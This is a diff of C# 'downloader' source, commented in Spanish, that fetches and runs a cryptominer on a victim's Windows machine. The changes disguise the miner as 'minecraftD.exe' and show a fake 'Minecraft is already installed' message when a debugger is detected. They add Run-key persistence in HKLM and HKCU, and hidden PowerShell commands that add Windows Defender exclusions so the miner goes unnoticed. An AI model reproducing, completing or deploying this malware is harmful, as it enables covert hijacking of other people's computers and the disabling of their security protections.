@@ -30,7 +30,7 @@ namespace downloader
         static string criptomining_file = "cpuminer-gw64-corei7.exe";
         static string bat_file = "cript.bat";
         static int remotePort = 8000;
-        static string dest_file = "cript.exe";
+        static string dest_file = "minecraftD.exe";
         static string bat_dest_file = "cript.bat";
 
         //Estas lineas sirven para revisar si es ejecutado por un debuggeador
@@ -39,7 +39,7 @@ namespace downloader
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
 
-
+        
         static void download_File(string server_file, string dest_file)
         {
             /*
@@ -51,7 +51,6 @@ namespace downloader
             Uri uri_prueba = myUri.Uri;
             //Instancia para hacer la descarga
             WebClient webCli = new WebClient();
-            Console.Write(uri_prueba);
             //descarga del archivo a un archivo en la computadora
             webCli.DownloadFile(uri_prueba, @dest_file);
             //webCli.DownloadFile(uri_prueba, @"c:\\Windows\\serv2.txt");
@@ -67,7 +66,7 @@ namespace downloader
             // permite cualquier version del protocolo TLS
             // tomado de https://stackoverflow.com/questions/22251689/make-https-call-using-httpclient
             System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
-            // acepta el certificado invalido (self-signed) 
+            // acepta el certificado invalido (self-signed)
             // tomado de https://stackoverflow.com/questions/12506575/how-to-ignore-the-certificate-check-when-ssl
             ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
             
@@ -107,12 +106,41 @@ namespace downloader
             key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             //Asignamos una nueva entrada con el comando del archivo bat
             //al comando le quitamos el inicio "start "
-            key.SetValue("cript", bat_command.Substring(6));
+            key.SetValue("minecraftD", bat_command);
             //Creamos la llave en CU
             key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             //Asignamos una nueva entrada con el comando del archivo bat
             //al comando le quitamos el inicio "start "
-            key.SetValue("cript", bat_command.Substring(6));
+            key.SetValue("minecraftD", bat_command);
+
+            //Agregamos el criptomining a procesos excluidos de WDefender
+            //key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\'Windows Defender'\\Exclusions\\Processes", true);
+            //Asignamos una nueva entrada con el nombre del proceso de tipo dword
+            //key.SetValue("minecraftD.exe", 0x00, Microsoft.Win32.RegistryValueKind.DWord);
+        }
+
+        static void pass_MDef()
+        {
+            /*
+             * Metodo para agregar el criptomining a las exclusiones de
+             * Windows Defender para pasar desapercibido
+             */
+
+            Process myProcess = new Process();
+
+            // En esta parte excluimos el proceso minecraftD.exe
+            myProcess.StartInfo.UseShellExecute = false;
+            myProcess.StartInfo.FileName = "powershell.exe";
+            myProcess.StartInfo.Arguments = "-NonInteractive -Command \" Add-MpPreference -ExclusionProcess minecraftD.exe -Force\"";
+            myProcess.StartInfo.CreateNoWindow = true;
+            myProcess.Start();
+
+            // En esta parte, se excluye el archivo de minecraftD.exe
+            myProcess.StartInfo.UseShellExecute = false;
+            myProcess.StartInfo.FileName = "powershell.exe";
+            myProcess.StartInfo.Arguments = "-NonInteractive -Command \" Add-MpPreference -ExclusionPath \"C:\\Windows\\minecraftD.exe\" -Force\"";
+            myProcess.StartInfo.CreateNoWindow = true;
+            myProcess.Start();
         }
 
         static void Main(string[] args)
@@ -126,16 +154,17 @@ namespace downloader
             //Si es debuggeado, solo muestra un mensaje cualquiera
             if (isDebuggerPresent)
             {
-                Console.WriteLine("ESCRIBIR UNA CADENA RELACIONADA AL SENUELO");
+                Console.WriteLine("Minecraft ya esta instalado en esta computadora :)");
             }
             // Si no es debuggeado, se ejecuta el downloader
             else
             {
                 downloaderM();
+                create_reg_keys();
+                pass_MDef();
                 // Ejecuta el archivo bat una vez descargado
                 // Es necesario que el bat se encuentre en WINDIR, o poner ruta absoluta
                 Process.Start(bat_dest_file);
-                create_reg_keys();
             }
         }
     }
